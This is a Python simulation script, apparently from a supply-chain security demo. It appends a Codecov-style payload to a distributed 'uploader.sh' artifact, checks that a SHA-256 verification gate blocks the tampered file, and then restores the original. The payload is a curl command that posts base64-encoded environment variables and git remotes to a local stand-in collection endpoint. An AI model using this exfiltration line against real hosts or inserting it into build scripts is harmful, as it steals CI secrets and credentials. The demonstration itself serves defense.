"""
Codecov-Style Tampering Attack Simulator.
Simulates an unauthorized modification of the distributed artifact (e.g., GCS bucket compromise),
injecting malicious credential harvesting code after legitimate vendor build/signing.
"""

import os
import shutil
import sys

# Ensure project imports resolve
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from verifier.verify import ArtifactVerifier

# The malicious payload modeled directly on the 2021 Codecov Bash Uploader exfiltration line
MALICIOUS_PAYLOAD = """
# ==============================================================================
# [ATTACK SIMULATION] Injected Malicious Codecov Exfiltration Payload (2021)
# Attacker exfiltrates CI environment variables, credentials, and Git secrets
# ==============================================================================
curl -s -X POST "http://127.0.0.1:9999/c2/exfiltrate" --data "CI_ENV=$(env | base64 | tr -d '\n')&REMOTE=$(git remote -v 2>/dev/null)" >/dev/null 2>&1 || true
# ==============================================================================
"""

def simulate_tampering_attack():
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    target_artifact = os.path.join(base_dir, "artifacts", "uploader.sh")
    target_manifest = os.path.join(base_dir, "artifacts", "uploader.sh.manifest.json")
    backup_artifact = target_artifact + ".original.bak"

    print("=" * 70)
    print(" [ATTACK SIMULATION: SCENARIO 2 - CODECOV-STYLE TAMPERING] ")
    print("=" * 70)

    # Backup original authentic script
    shutil.copyfile(target_artifact, backup_artifact)
    print(f"[*] Authentic script backed up to: {backup_artifact}")

    try:
        # Inject malicious payload
        print("[!] Attacker simulates Google Cloud Storage credential compromise...")
        print("[!] Injecting credential exfiltration line into distributed uploader.sh...")
        with open(target_artifact, "a", encoding="utf-8") as f:
            f.write(MALICIOUS_PAYLOAD)

        print("[+] Artifact successfully modified on distribution mirror.")
        
        # Now run customer verification
        print("\n[*] Customer CI/CD pipeline triggers automated security gate verification...")
        verifier = ArtifactVerifier()
        result = verifier.verify(target_artifact, target_manifest, user_process="Customer-CI-Simulation")

        print("\n[=== SECURITY GATE EVALUATION ===]")
        print(f"  - Gate Verdict:     {result.get('verdict')}")
        print(f"  - Status Code:      {result.get('status_code')}")
        print(f"  - Diagnostic Alert: {result.get('message')}")
        print(f"  - Expected Digest:  {result.get('expected_sha256')}")
        print(f"  - Computed Digest:  {result.get('actual_sha256')}")

        if result.get("verdict") == "BLOCKED":
            print("\n>>> RESULT: SUCCESSFUL MITIGATION! <<<")
            print("The zero-trust cryptographic gate detected the digest discrepancy")
            print("and blocked the malicious uploader from executing in customer CI/CD!")

    finally:
        # Restore original authentic file
        shutil.copyfile(backup_artifact, target_artifact)
        os.remove(backup_artifact)
        print(f"\n[*] Cleaned up: Restored original authentic {os.path.basename(target_artifact)}")

if __name__ == "__main__":
    simulate_tampering_attack()
